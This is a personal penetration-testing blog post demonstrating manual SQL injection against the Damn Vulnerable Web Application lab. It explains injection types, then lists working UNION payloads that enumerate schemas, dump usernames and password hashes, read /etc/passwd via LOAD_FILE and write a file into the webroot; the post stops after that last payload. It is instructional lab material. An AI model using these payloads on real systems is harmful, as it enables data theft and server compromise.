---
title: "Hello World"
date: 2024-11-03 00:00:00 +0600
categories: [Hello World]
tags: [Hello World]
---

## Introduction

Welcome to my latest blog post, where I'll be diving deep into the world of penetration testing and demonstrating my methodology for identifying SQL and Blind SQL injections. Using the Damn Vulnerable Web Application as our target and lab environment, I'll be taking a gray or black box approach to enumeration, meaning we won't have access to the website's code. This will showcase the real-world challenges that security professionals face when trying to identify and exploit vulnerabilities. So, get ready to learn how to identify SQL injection vulnerabilities and take control of your target, one step at a time.

## Fundamental Concepts

Before diving into the intricacies of SQL injections, it's important to have a solid understanding of the underlying technologies involved. This includes how websites interact with SQL databases, the basics of SQL syntax, and how queries are executed.

At a high level, websites typically use SQL databases to store and manage their data. This data is accessed and manipulated through SQL queries, which are statements written in the SQL language. Understanding the structure and syntax of these queries is critical for identifying potential vulnerabilities that could be exploited through SQL injection attacks.

With that in mind, let's explore the fundamental concepts you'll need to know in order to effectively identify and defend against SQL injections.

## How websites interact with SQL databases

Web applications rely on databases to store and retrieve data related to the application. These databases use a language called SQL, which allows for the storage, management, and retrieval of structured data.

When a user interacts with a web application, their actions may trigger SQL queries to retrieve or store data in the database. For example, when a user submits a form to create a new account, the web application sends an SQL query to the database to store the user's information.

![[Pasted image 20230409140310.png]]

Web applications are typically divided into three tiers. The first tier is the client-side application, such as a website or a GUI program, where users interact with the application. The second tier is the middleware, which interprets the user's actions and sends SQL queries to the database. The third and final tier is the database management system (DBMS), which receives the queries and performs the requested operations.

However, when a user inputs a maliciously constructed input that tricks the SQL query into being used for something other than what the original programmer intended, it can allow the user to access and manipulate the database. This type of attack is known as an SQL injection.

SQL injection attacks can be used to steal data or gain unauthorized access to the database. Therefore, it is essential to understand how SQL queries work and to implement best practices to secure them against potential SQL injection attacks.

## Fundamentals of SQL Queries

SQL (Structured Query Language) is a programming language used for managing and manipulating relational databases. It allows users to create, modify, and retrieve data from databases. SQL queries are used to extract information from a database and provide results based on specific criteria. Here are some essential concepts to understand about SQL queries:

### SELECT Statement

The SELECT statement is used to retrieve data from a table. It allows you to specify which columns to retrieve and filter data based on specific criteria. The basic syntax of the SELECT statement is as follows:

```sql
SELECT column1, column2, ... FROM table_name;
```

### WHERE Clause

The WHERE clause is used to filter data based on specific conditions. It can be used to extract only the data that meets a certain set of criteria. The basic syntax of the WHERE clause is as follows:
```sql
SELECT column1, column2, ... FROM table_name WHERE condition;
```

### UNION Statements

A UNION statement in SQL is used to combine the results of two or more SELECT statements into a single result set. The SELECT statements that are being combined by the UNION statement must have the same number of columns and compatible data types.

The basic syntax for a UNION statement is as follows:
```sql
SELECT column1, column2, ... FROM table1 
UNION 
SELECT column1, column2, ... FROM table2
```

The result of the UNION statement will be a combination of the results of the two SELECT statements, with duplicate rows removed.

### Other Important SQL Queries

While it's important to understand other SQL statements and operators such as INSERT, DROP, UPDATE, AND, OR, ALTER, JOIN, and ORDER BY, this blog post is primarily focused on SQL injections and how to identify and exploit them. If you're looking to learn more about basic SQL queries, a great resource is w3schools, which provides interactive examples for you to explore and gain a better understanding of how SQL queries work. Check out this link to learn more: [https://www.w3schools.com/sql/](https://www.w3schools.com/sql/). However, for the purpose of the demo on the Damn Vulnerable Web App, the three queries mentioned earlier will be the most important to know.

## SQL Injection

SQL Injection is a type of web application vulnerability that allows an attacker to inject malicious code into an SQL statement. This is often possible by exploiting poor input validation in a web application. By executing arbitrary SQL code, an attacker can potentially gain unauthorized access to a database or sensitive information.

To prevent SQL Injection attacks, sanitization is the process of removing any special characters from user input. This prevents injection attempts by escaping user input bounds with special characters like ('), and then writing code to be executed, like JavaScript code or SQL in SQL Injections. If user input is not properly sanitized, the injected code is likely to be executed and run.

In a typical SQL Injection scenario, user input is inserted into an SQL query string without proper sanitization or filtering. The searchInput would be used to complete the query, returning the expected outcome. SQL Injections are categorized based on how and where we retrieve their output.

In simpler cases, the output of both the intended and the new query may be printed directly on the front-end, and we can directly read it. This is known as In-band SQL Injection, and it has two types: Union Based and Error Based. With Union Based SQL injection, we may have to specify the exact location, i.e. column, which we can read, so the query will direct the output to be printed there. In Error Based SQL injection, we intentionally cause an SQL error that returns the output of our query by getting PHP or SQL errors in the front-end.

In more complex cases, we may not get the output printed, so we utilize SQL logic to retrieve the output character by character. This is known as Blind SQL Injection, and it also has two types: Boolean Based and Time Based. With Boolean Based SQL injection, we can use SQL conditional statements to control whether the page returns any output at all, i.e. the original query response, if our conditional statement returns true. Time Based SQL Injections, on the other hand, use SQL conditional statements that delay the page response if the conditional statement returns true using the Sleep() function.

## Demo

Now I will begin enumerating the Damn Vulnerable Web App for SQL Injections. This is my methodology when I face against SQL Injections without any tools like SQLMap. 

### Prerequisites
- BurpSuite
- Damn Vulnerable Web App Lab Environment
- Conceptual understanding of SQL and Blind SQL Injections

### Using the Web App as intended

The first thing that I do when I am performing a penetration test or CTF-alike against a web application, is that I simply begin using the web application as intended. In this case, we are prompted with this:

![[Pasted image 20230424000253.png]]

Simply a textbox promping for a User ID. I begin by just putting what I believe would be valid credentials. I would begin by putting some number input, and clicking submit. I would input a few numbers, and would find that `1` actually prints out the admin user information:

![[Pasted image 20230424000541.png]]

So from this, we know that if I enter a valid number, then the website would respond with the ID, First name, and Surname.

With this information alone, we are not given much, we know that we are sending an ID, and receiving an ID, First name, and Surname. I can imagine that the SQL Query statement would look something like this:

```sql
SELECT id, first_name, surname FROM users WHERE user_id = ' ';
```

From this, I know my input is within the quotes. I can easily inject the following payload to see if the web app is vulnerable to SQL Injection:

```sql
'
```

By putting a single quote, I break the SQL query as there is an odd number of quotations, assuming there is no sanitization. As a result, I get this:

![[Pasted image 20230424002546.png]]
```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1
```

From this, I am shown an error page, and know that this web application is definitely vulnerable to SQL Injections as no sanitization was used. I begin using a basic payload to retrieve everything in the table that I am retrieving from:

```sql
bs' OR '1'='1'-- -
```

This payload basically inputs `bs`, for bogus information as an input, and then I escape the quotes by inputting my own quote, and then I inject my own SQL statement `OR '1'='1'`, which basically tells the SQL statement to retrieve everything where `'1'='1'` is true, then I use comments to comment out the last quote. So the SQL statement being run looks something like this:

```sql
SELECT id, first_name, surname FROM users WHERE user_id = 'bs' OR '1'='1'-- - ';
```

As a result, we get this as the output:

![[Pasted image 20230424003709.png]]

From this output, we obtain all the First names and Surnames from the table. But what now? We can maybe use these credentials to login, but we have only scratched the surface of what SQL injections can do. We can go further and enumerate for other tables, perhaps find the table that stores passwords, or possibly obtain remote code execution right here.

I begin, by enumerating how many columns the table we are currently interacting with has by using the following payload:

```sql
bs' UNION SELECT 1 -- -
```

This payload essentially selects dummy data for the first column, and as you know, UNION statements can only work if both SELECT statements refer to the same number of columns. So if this statement works, then I know that the tables I am working with has only 1 column, but if it doesn't work, then I have to keep guessing by selecting more columns with more dummy data until the query executes. To illustrate this further, here is the SQL query we are executing:

```sql
SELECT id, first_name, surname FROM users WHERE user_id = 'bs' UNION SELECT 1 -- -';
```

In this query, we are executing 2 SELECT statements, the first being SELECT id, firstname, surname, and the second one being SELECT 1. As you can see, I am speculating that we are probably selecting 3 columns in the first statement, and 1 column in the second SELECT statement, which is unven. I obtain this output when I run the injection:

![[Pasted image 20230424004915.png]]
```
The used SELECT statements have a different number of columns
```

As expected, we have an uneven amount of columns, so I edit my payload to this, to try 2 columns instead of 1:

```sql
bs' UNION SELECT 1, 2 -- -
```

![[Pasted image 20230424005612.png]]

Surprisingly, this actually works, so my speculation that the first query was selecting 3 columns was incorrect, it was only selecting 2 columns. So I believe that the query running in the backend with this injection looks like this:

```sql
SELECT first_name, surname FROM users WHERE user_id = 'bs' UNION SELECT 1, 2 -- -';
```

As you can see, it is most likely not selecting the id, but just the first_name and surname. Finally, I was able to match the number of columns in both SELECT statements using UNION, so now we know that they are 2 columns we are working with. 

```sql
1' UNION SELECT 1, @@version -- -
```

```sql
1' UNION SELECT 1, SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA-- -
```

```sql
1' UNION SELECT SCHEMA_NAME, database() from INFORMATION_SCHEMA.SCHEMATA-- -
```

```sql
1' UNION SELECT TABLE_NAME, TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES-- -
```

```sql
1' UNION SELECT TABLE_NAME, TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA='dvwa'-- -
```

```sql
1' UNION SELECT COLUMN_NAME, 2 from INFORMATION_SCHEMA.COLUMNS  -- -
```

```sql
1' UNION SELECT COLUMN_NAME, TABLE_NAME from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='dvwa' -- -
```

- Schema/Database:
	- dvwa
- Table Names:
	- guestbook
	- users

- Column Names for `users` Table
	- user_id
	- first_name
	- last_name
	- user
	- password
	- avatar
	- last_login
	- failed_login

- Column names for `guestbook`
	- comment_id
	- comment
	- name

```sql
1' UNION SELECT user, password FROM dvwa.users -- -
```

```sql
1' UNION SELECT 1, user() -- -
```

```sql
1' UNION SELECT grantee, privilege_type FROM information_schema.user_privileges-- -
```

```sql
1' UNION SELECT 1, LOAD_FILE("/etc/passwd") -- -
```

```sql
1' UNION SELECT 1, LOAD_FILE("/var/www/html/vulnerabilities/sqli/")-- -
```

```sql
1' UNION SELECT variable_name, variable_value FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
```

```sql
1' UNION SELECT 'file written successfully!', 2 into outfile '/var/www/html/proof.txt'-- -
```

